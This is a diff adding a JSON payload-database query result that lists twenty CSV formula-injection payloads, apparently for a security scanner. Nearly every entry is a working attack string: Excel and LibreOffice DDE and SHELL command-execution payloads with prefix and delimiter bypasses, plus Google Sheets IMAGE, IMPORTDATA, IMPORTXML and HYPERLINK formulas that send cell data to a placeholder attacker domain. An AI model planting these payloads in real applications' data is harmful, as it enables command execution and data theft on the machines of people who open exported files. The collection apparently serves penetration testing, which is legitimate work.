@@ -1,0 +1,368 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "csv_injection"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "197cb6e3f83d794c",
+      "payload": "=1+1",
+      "technique": "formula_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Formula probe via JSON body (e.g., profile name, comment field that ends up in CSV export).",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "json",
+        "probe"
+      ]
+    },
+    {
+      "id": "3c5f981a4e924e8a",
+      "payload": "=CONCAT(A1,B1)",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Apple Numbers / macOS probe. CONCAT is processed in Numbers — if reflected as computed result rather than literal, formula injection is confirmed. Numbers does not support DDE but formula evaluation leaks data between cells.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "macos",
+        "numbers",
+        "probe"
+      ]
+    },
+    {
+      "id": "3cc46e791722f3e5",
+      "payload": "=1+1",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Minimal formula probe. If exported CSV opens in spreadsheet and shows 2 instead of =1+1, formulas are interpreted.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "probe"
+      ]
+    },
+    {
+      "id": "04a41b61be138024",
+      "payload": "=IMAGE(\"http://COLLAB_DOMAIN/?data=\"\u0026A1)",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Google Sheets IMAGE formula. Loads remote image with data in URL.",
+      "source": "ensphere",
+      "tags": [
+        "exfiltration",
+        "google_sheets",
+        "image",
+        "oob"
+      ]
+    },
+    {
+      "id": "107a46e57fd0ca6f",
+      "payload": "=SHELL(\"calc.exe\")",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LibreOffice SHELL function. Executes command if macro security is low.",
+      "source": "ensphere",
+      "tags": [
+        "libreoffice",
+        "rce",
+        "shell"
+      ]
+    },
+    {
+      "id": "175605ab27a32aaf",
+      "payload": "value\",\"=cmd|'/C calc.exe'!A0\r\ninjected_row,\"=1+1",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CSV row injection. Breaks out of current cell and injects a new row with formulas. Tests whether the app properly escapes CSV field delimiters and row separators.",
+      "source": "ensphere",
+      "tags": [
+        "csv_escape",
+        "field_breakout",
+        "row_injection"
+      ]
+    },
+    {
+      "id": "42c09f8a1a87020d",
+      "payload": "+cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Plus-prefixed DDE. Some parsers strip = but not +.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel"
+      ]
+    },
+    {
+      "id": "54098718bb8e497c",
+      "payload": "=\";=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Quoted field with semicolon then formula. May bypass prefix sanitization.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel",
+        "quoted"
+      ]
+    },
+    {
+      "id": "5bc1fedc865df714",
+      "payload": "@SUM(1+1)*cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "At-sign prefixed DDE. Less commonly filtered than = or +.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel"
+      ]
+    },
+    {
+      "id": "6284ff346c0749f9",
+      "payload": "-cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Minus-prefixed DDE variant. Tests if minus is treated as formula prefix.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel"
+      ]
+    },
+    {
+      "id": "7c3762f638dae303",
+      "payload": "=HYPERLINK(\"http://COLLAB_DOMAIN/?data=\"\u0026A1,\"Click here\")",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Exfiltrate cell A1 value via hyperlink to attacker domain. Requires user click.",
+      "source": "ensphere",
+      "tags": [
+        "exfiltration",
+        "hyperlink",
+        "oob"
+      ]
+    },
+    {
+      "id": "7e5ed694f6135293",
+      "payload": "=HYPERLINK(\"http://COLLAB_DOMAIN/?data=\"\u0026A1,\"Click\")",
+      "technique": "formula_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Hyperlink exfiltration via JSON body.",
+      "source": "ensphere",
+      "tags": [
+        "exfiltration",
+        "hyperlink",
+        "json",
+        "oob"
+      ]
+    },
+    {
+      "id": "7f0cc14efc88a3d7",
+      "payload": "=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Classic DDE payload for Excel. Opens calculator if macros/DDE enabled.",
+      "source": "ensphere",
+      "tags": [
+        "dde",
+        "excel",
+        "windows"
+      ]
+    },
+    {
+      "id": "7fa2963fb0930055",
+      "payload": "=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "DDE formula via JSON body field.",
+      "source": "ensphere",
+      "tags": [
+        "dde",
+        "excel",
+        "json"
+      ]
+    },
+    {
+      "id": "8a28b6d8cb11bfef",
+      "payload": "=IMPORTDATA(\"http://COLLAB_DOMAIN/?data=\"\u0026A1)",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Google Sheets IMPORTDATA. Fetches URL with cell data appended.",
+      "source": "ensphere",
+      "tags": [
+        "exfiltration",
+        "google_sheets",
+        "importdata",
+        "oob"
+      ]
+    },
+    {
+      "id": "9883c6aeca1c0356",
+      "payload": "=IMPORTXML(\"http://COLLAB_DOMAIN/?data=\"\u0026A1,\"//a\")",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Google Sheets IMPORTXML. Exfiltrates cell data to attacker domain automatically.",
+      "source": "ensphere",
+      "tags": [
+        "exfiltration",
+        "google_sheets",
+        "importxml",
+        "oob"
+      ]
+    },
+    {
+      "id": "b1b44dd404f20238",
+      "payload": "\r\n=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Newline-prefixed DDE. Injects formula into new CSV row.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel",
+        "newline"
+      ]
+    },
+    {
+      "id": "b7acbd173368507a",
+      "payload": "\t=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Tab-prefixed DDE. Tab may be stripped during import, exposing formula.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dde",
+        "excel",
+        "tab"
+      ]
+    },
+    {
+      "id": "bd9cdd500b50cbf4",
+      "payload": "=DDE(\"cmd\";\"/C calc.exe\";\"\")",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LibreOffice DDE syntax (semicolons instead of pipes).",
+      "source": "ensphere",
+      "tags": [
+        "dde",
+        "libreoffice"
+      ]
+    },
+    {
+      "id": "e5010df0ba1d5a13",
+      "payload": "\";=cmd|'/C calc.exe'!A0",
+      "technique": "formula_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CSV field escape — close quoted field with \", then semicolon delimiter starts new cell containing formula. Exploits CSV structure rather than formula parsing.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "csv_escape",
+        "dde",
+        "excel",
+        "field_breakout"
+      ]
+    }
+  ]
+}
